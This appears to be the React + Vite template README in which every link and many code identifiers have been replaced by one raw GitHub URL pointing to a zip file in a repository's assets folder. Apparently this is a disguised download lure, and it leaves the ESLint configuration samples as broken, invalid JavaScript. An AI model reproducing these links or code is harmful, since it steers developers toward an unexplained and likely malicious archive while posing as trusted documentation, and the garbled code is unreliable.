# React + JavaScript + Vite

This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.

Currently, two official plugins are available:

- [@vitejs/plugin-react](https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip) uses [Babel](https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip) for Fast Refresh
- [@vitejs/plugin-react-swc](https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip) uses [SWC](https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip) for Fast Refresh

## Expanding the ESLint configuration

If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:

```js
export default https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip({
  extends: [
    // Remove https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip and replace with this
    https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip,
    // Alternatively, use this for stricter rules
    https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip,
    // Optionally, add this for stylistic rules
    https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip,
  ],
  languageOptions: {
    // other options...
    parserOptions: {
      project: ['https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip', 'https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip'],
      tsconfigRootDir: https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip,
    },
  },
})
```

You can also install [eslint-plugin-react-x](https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip) and [eslint-plugin-react-dom](https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip) for React-specific lint rules:

```js
// https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip
import reactX from 'eslint-plugin-react-x'
import reactDom from 'eslint-plugin-react-dom'

export default https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip({
  plugins: {
    // Add the react-x and react-dom plugins
    'react-x': reactX,
    'react-dom': reactDom,
  },
  rules: {
    // other rules...
    // Enable its recommended typescript rules
    https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip['recommended-typescript'].rules,
    https://raw.githubusercontent.com/Nikunj1810/P1/main/src/assets/P1-guttulate.zip,
  },
})
```
